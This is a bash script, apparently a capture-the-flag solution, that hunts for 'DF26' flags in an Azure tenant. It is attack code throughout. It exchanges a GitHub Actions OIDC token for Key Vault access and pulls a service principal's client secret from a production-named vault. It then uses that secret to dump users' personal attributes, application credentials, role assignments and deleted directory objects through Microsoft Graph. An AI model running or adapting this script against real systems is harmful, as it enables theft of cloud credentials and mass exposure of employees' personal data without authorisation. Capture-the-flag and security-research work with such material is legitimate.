#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"
G="https://graph.microsoft.com/v1.0"; GB="https://graph.microsoft.com/beta"

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
J=$(curl -sS $M -H "Authorization: Bearer $KV" "$PRODKV/secrets/directory-audit-principal?api-version=7.4" | jq -r '.value')
appId=$(printf '%s' "$J" | jq -r '.appId // .clientId'); sec=$(printf '%s' "$J" | jq -r '.clientSecret // .password // .secret'); ten=$(printf '%s' "$J" | jq -r '.tenant // .tenantId // empty'); [ -z "$ten" ] && ten=$AZURE_TENANT_ID
T=$(curl -sS $M -X POST "https://login.microsoftonline.com/$ten/oauth2/v2.0/token" -d "client_id=$appId" -d "client_secret=$sec" -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
echo "graph token len=${#T}"
H=(-H "Authorization: Bearer $T")
DIR=/tmp/g2; mkdir -p "$DIR"; n=0
get () { n=$((n+1)); local f="$DIR/$(printf '%03d' $n)_$1"; shift; curl -sS $M "${H[@]}" "$@" -o "$f" 2>/dev/null; local h; h=$(grep -aoE "DF26\{[^}]*\}" "$f"|sort -u); local e; e=$(jq -r '.error.code // empty' "$f" 2>/dev/null); echo "  $(basename "$f"): ${e:+ERR:$e} ${h:+<<<FLAG:$h}"; [ -n "$h" ] && grep -ao ".\{0,100\}DF26{[^}]*}" "$f"|head; }

echo "=== users (full + ext attrs + custom sec attrs) ==="
get users_full.json "$GB/users?\$top=999&\$select=id,displayName,userPrincipalName,mail,jobTitle,department,employeeId,companyName,officeLocation,streetAddress,city,state,aboutMe,mySite,onPremisesExtensionAttributes,onPremisesSamAccountName,identities,otherMails,businessPhones,employeeType,costCenter,division,givenName,surname"
get users_csa.json "$GB/users?\$top=999&\$select=id,displayName,customSecurityAttributes"

echo "=== applications: list ids then per-app detail ==="
get apps_list.json "$G/applications?\$top=999&\$select=id,appId,displayName"
APPIDS=$(jq -r '.value[]?.id' "$DIR/"*apps_list.json 2>/dev/null)
for id in $APPIDS; do
  get "app_$id.json" "$GB/applications/$id"
  get "app_${id}_fic.json" "$G/applications/$id/federatedIdentityCredentials"
  get "app_${id}_owners.json" "$G/applications/$id/owners"
  get "app_${id}_extprop.json" "$G/applications/$id/extensionProperties"
done

echo "=== service principals custom sec attrs + full beta (paged) ==="
get sp_csa.json "$GB/servicePrincipals?\$top=999&\$select=id,displayName,customSecurityAttributes"
get sp_full1.json "$GB/servicePrincipals?\$top=999"
NEXT=$(jq -r '."@odata.nextLink" // empty' "$DIR/"*sp_full1.json 2>/dev/null)
[ -n "$NEXT" ] && get sp_full2.json "$NEXT"

echo "=== deleted items (sp/group/user/app full) ==="
get del_app.json "$GB/directory/deletedItems/microsoft.graph.application?\$top=999"
get del_sp.json "$GB/directory/deletedItems/microsoft.graph.servicePrincipal?\$top=999"
get del_grp.json "$GB/directory/deletedItems/microsoft.graph.group?\$top=999"
get del_usr.json "$GB/directory/deletedItems/microsoft.graph.user?\$top=999"

echo "=== org + branding + directory roles ==="
get org.json "$G/organization"
ORGID=$(jq -r '.value[0].id // empty' "$DIR/"*org.json 2>/dev/null)
[ -n "$ORGID" ] && get branding.json "$GB/organization/$ORGID/branding/localizations"
get dirroles.json "$G/directoryRoles"
get roleassign.json "$GB/roleManagement/directory/roleAssignments?\$top=999"
get groups.json "$G/groups?\$top=999"
get admu.json "$G/administrativeUnits?\$top=999"

echo "===== FINAL: DF26 across all graph2 dumps ====="
grep -raoE "DF26\{[^}]*\}" "$DIR" 2>/dev/null | sort -u || echo "(no DF26{...})"
echo "===== hints: lines mentioning 'flag' (case-insensitive), any file ====="
grep -rain "flag" "$DIR" 2>/dev/null | grep -aviE "conditionalaccess|flagged|signInActivity" | head -30 || true
echo "GRAPH2 DONE"; exit 0
